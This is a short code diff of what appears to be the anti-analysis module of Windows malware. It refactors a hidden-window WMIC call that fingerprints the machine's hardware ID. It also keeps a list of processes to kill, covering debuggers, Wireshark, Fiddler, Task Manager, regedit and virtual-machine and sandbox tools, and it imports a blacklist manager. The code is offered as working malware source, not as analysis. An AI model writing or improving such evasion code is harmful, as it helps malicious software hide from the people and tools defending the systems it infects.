@@ -1,6 +1,6 @@
 from os import _exit, environ, sep, getenv
 from os.path import exists
-from subprocess import check_output, PIPE, STARTF_USESHOWWINDOW, STARTUPINFO
+from subprocess import check_output, PIPE
 from psutil import process_iter
 from uuid import UUID, getnode
 from wmi import WMI
@@ -9,21 +9,16 @@ from requests import get
 from platform import system
 from json import loads
 from manager.blacklist import BlackList
+from manager.manager import HIDDEN_WINDOW
 from preferences.config import config
-
-
-
 
 
 
 kill_Processes =["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
 
 def checkHWID():
-    startupinfo = STARTUPINFO()
-    startupinfo.dwFlags |= STARTF_USESHOWWINDOW
-
     try:
-        return check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=PIPE, stderr=PIPE, startupinfo=startupinfo).decode('utf-8').split('\n')[1].strip()
+        return check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=PIPE, stderr=PIPE, startupinfo=HIDDEN_WINDOW).decode('utf-8').split('\n')[1].strip()
     except:
         return "No data"
 
